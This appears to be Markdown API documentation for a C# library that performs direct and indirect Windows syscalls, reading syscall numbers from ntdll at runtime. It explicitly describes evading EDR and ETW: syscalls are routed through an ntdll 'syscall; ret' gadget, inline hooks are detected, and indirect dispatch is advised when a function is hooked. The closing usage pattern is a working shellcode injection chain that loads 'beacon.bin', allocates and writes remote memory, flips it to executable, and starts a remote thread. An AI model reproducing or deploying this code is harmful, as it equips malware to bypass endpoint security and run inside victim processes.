# Syscalls

Direct and indirect syscall dispatch. SSNs (syscall service numbers) are extracted at runtime by parsing ntdll stubs in memory, so they stay correct across Windows versions without needing a hardcoded table. `SyscallStub` lets you build a reusable executable stub for indirect dispatch using a gadget address you supply.

All methods in `Syscalls` are `unsafe` internally. The class itself is marked `unsafe` and the project must have `AllowUnsafeBlocks` enabled (it already does).

---

## Types

### `SyscallResult`

NTSTATUS codes as named constants. Not used as a return type — all methods return `int` or `uint` directly — but useful for comparison.

| Value | Constant | Description |
|---|---|---|
| `0x00000000` | `Success` | Call completed successfully. |
| `0xC0000022` | `AccessDenied` | Insufficient privileges. |
| `0xC000000D` | `InvalidParameter` | Bad argument. |
| `0xC000009A` | `InsufficientResources` | Not enough memory or handles. |
| `0xC0000002` | `NotImplemented` | SSN could not be extracted. |
| `0xC0000034` | `ObjectNameNotFound` | Target object doesn't exist. |
| `0xC0000008` | `InvalidHandle` | Handle is closed or invalid. |
| `0xC0000017` | `NoMemory` | Allocation request failed. |

---

### `SyscallStub`

An `IDisposable` wrapper for a single indirect syscall stub. Allocates a small executable region containing:

```
mov r10, rcx         ; 4C 8B D1
mov eax, <SSN>       ; B8 xx xx xx xx
mov r11, <gadget>    ; 49 BB xx xx xx xx xx xx xx xx
jmp r11              ; 41 FF E3
```

The gadget should be a `syscall; ret` sequence inside ntdll — not inside your module, so ETW/EDR tracing sees the syscall originating from ntdll's address range.

| Member | Description |
|---|---|
| `StubAddress` | Address of the allocated executable stub. |
| `SyscallStub(uint syscallNumber, IntPtr syscallGadgetAddress)` | Allocates and patches the stub. |
| `Dispose()` | Frees the executable memory. |

```csharp
var ssn = Syscalls.GetSyscallNumber("NtOpenProcess");
var gadget = Syscalls.GetSyscallGadget();

using var stub = new SyscallStub(ssn, gadget);
Console.WriteLine($"Stub at 0x{stub.StubAddress.ToInt64():X}");
// invoke stub via a function pointer cast
```

---

## Initialization

### `Syscalls.Initialize()`

Walks the ntdll export table and extracts SSNs by reading the first few bytes of each function stub. Thread-safe — subsequent calls are no-ops. You don't have to call this manually; every other method in the class calls it on first use.

```csharp
Syscalls.Initialize();
```

The extraction looks for the standard prologue `4C 8B D1 B8 xx xx 00 00 0F 05` and reads the two bytes after `B8` as the SSN. If a function is hooked (prologue replaced with a `jmp`), the SSN won't be extracted and `GetSyscallNumber` will return `0` for it.

---

## Utility Methods

### `GetSyscallNumber(string functionName)`

Returns the SSN for the given ntdll function name. Returns `0` if the function wasn't found or its stub was hooked.

```csharp
var ssn = Syscalls.GetSyscallNumber("NtAllocateVirtualMemory");
Console.WriteLine($"SSN: 0x{ssn:X4}");
```

Case-insensitive.

---

### `GetSyscallGadget()`

Finds a `syscall; ret` byte sequence (`0F 05 C3`) inside ntdll's `.text` section and returns its address. Use this as the gadget address for `SyscallStub`.

```csharp
var gadget = Syscalls.GetSyscallGadget();
Console.WriteLine($"Gadget at 0x{gadget.ToInt64():X}");
```

Returns `IntPtr.Zero` if no gadget is found.

---

### `IsHooked(string functionName)`

Returns `true` if the first byte of the ntdll export is not `0x4C` (the start of the standard `mov r10, rcx` prologue). A `0xE9` (`jmp`) or `0xFF` at the start typically means an EDR has placed an inline hook.

```csharp
if (Syscalls.IsHooked("NtCreateThreadEx"))
    Console.WriteLine("NtCreateThreadEx is hooked — use indirect dispatch");
```

---

### `AuditNtFunctions(IEnumerable<string> functionNames)`

Runs `IsHooked` on a list of function names and returns a `Dictionary<string, bool>` mapping each name to its hook status.

```csharp
var targets = new[] { "NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx" };
var audit = Syscalls.AuditNtFunctions(targets);

foreach (var kv in audit)
    Console.WriteLine($"{kv.Key}: {(kv.Value ? "HOOKED" : "clean")}");
```

---

## Syscall Wrappers

Each wrapper extracts the SSN, builds a short executable stub, casts it to a function pointer, calls it, and frees the stub. The stubs are per-call allocations — there's no global stub pool.

If `GetSyscallNumber` returns `0` for the target function (hooked or not found), the method returns `(int)SyscallResult.NotImplemented` (`0xC0000002`).

---

### `NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint allocationType, uint protect)`

Allocates virtual memory. `baseAddress` is updated with the actual allocated address. Pass `IntPtr.Zero` for `baseAddress` to let the OS choose.

```csharp
var addr = IntPtr.Zero;
var size = (IntPtr)0x1000;

var status = Syscalls.NtAllocateVirtualMemory(
    Win32.GetCurrentProcess(),
    ref addr,
    ref size,
    Win32.MEM_COMMIT | Win32.MEM_RESERVE,
    Win32.PAGE_READWRITE);

if (status == 0)
    Console.WriteLine($"Allocated at 0x{addr.ToInt64():X}");
```

---

### `NtFreeVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr regionSize, uint freeType)`

Frees a virtual memory region. When using `MEM_RELEASE`, set `regionSize` to `IntPtr.Zero` — the OS determines the size from the original allocation.

```csharp
var freeAddr = addr;
var freeSize = IntPtr.Zero;
Syscalls.NtFreeVirtualMemory(Win32.GetCurrentProcess(), ref freeAddr, ref freeSize, Win32.MEM_RELEASE);
```

---

### `NtProtectVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, ref IntPtr numberOfBytes, uint newProtect, out uint oldProtect)`

Changes the protection on a memory region. The previous protection value is written to `oldProtect`.

```csharp
var protAddr = addr;
var protSize = (IntPtr)0x1000;
Syscalls.NtProtectVirtualMemory(
    Win32.GetCurrentProcess(),
    ref protAddr,
    ref protSize,
    Win32.PAGE_EXECUTE_READ,
    out var old);
Console.WriteLine($"Old protection: 0x{old:X2}");
```

---

### `NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, out uint bytesWritten)`

Writes bytes into a process's virtual memory. `bytesWritten` is updated with the number of bytes actually written.

```csharp
var status = Syscalls.NtWriteVirtualMemory(hProc, remoteAddr, shellcode, out var written);
Console.WriteLine($"Wrote {written} bytes, status 0x{status:X8}");
```

---

### `NtReadVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, out uint bytesRead)`

Reads bytes from a process's virtual memory into `buffer`.

```csharp
var buf = new byte[0x200];
var status = Syscalls.NtReadVirtualMemory(hProc, targetAddr, buf, out var read);
```

---

### `NtOpenProcess(out IntPtr processHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr clientId)`

Opens a handle to a process. `objectAttributes` and `clientId` are typically `IntPtr.Zero` for basic usage, but a proper `CLIENT_ID` struct with the target PID should be passed for correct behavior. Construct it with `Marshal.AllocHGlobal` if needed.

```csharp
var status = Syscalls.NtOpenProcess(
    out var hProc,
    Win32.PROCESS_ALL_ACCESS,
    IntPtr.Zero,
    IntPtr.Zero);
```

---

### `NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr processHandle, IntPtr startRoutine, IntPtr argument, uint createFlags)`

Creates a thread in a process. Pass `0` for `createFlags` to start immediately. Pass `Win32.CREATE_SUSPENDED` to start the thread suspended.

```csharp
var status = Syscalls.NtCreateThreadEx(
    out var hThread,
    0x1FFFFF,
    hProc,
    shellcodeAddr,
    IntPtr.Zero,
    0);

if (status == 0)
    Console.WriteLine($"Thread handle: 0x{hThread.ToInt64():X}");
```

---

## Usage Pattern: Full Allocation + Injection via Syscalls

```csharp
Syscalls.Initialize();

// audit first
var audit = Syscalls.AuditNtFunctions(new[]
{
    "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
    "NtProtectVirtualMemory", "NtCreateThreadEx"
});

foreach (var kv in audit.Where(k => k.Value))
    Console.WriteLine($"WARNING: {kv.Key} is hooked");

var hProc = Win32.OpenProcess(Win32.PROCESS_ALL_ACCESS, false, targetPid);
var shellcode = File.ReadAllBytes("beacon.bin");

// allocate RW
var remoteBase = IntPtr.Zero;
var allocSize = (IntPtr)shellcode.Length;
Syscalls.NtAllocateVirtualMemory(hProc, ref remoteBase, ref allocSize,
    Win32.MEM_COMMIT | Win32.MEM_RESERVE, Win32.PAGE_READWRITE);

// write
Syscalls.NtWriteVirtualMemory(hProc, remoteBase, shellcode, out _);

// flip to RX
var protBase = remoteBase;
var protSize = allocSize;
Syscalls.NtProtectVirtualMemory(hProc, ref protBase, ref protSize, Win32.PAGE_EXECUTE_READ, out _);

// execute
Syscalls.NtCreateThreadEx(out var hThread, 0x1FFFFF, hProc, remoteBase, IntPtr.Zero, 0);

Win32.CloseHandle(hThread);
Win32.CloseHandle(hProc);
```
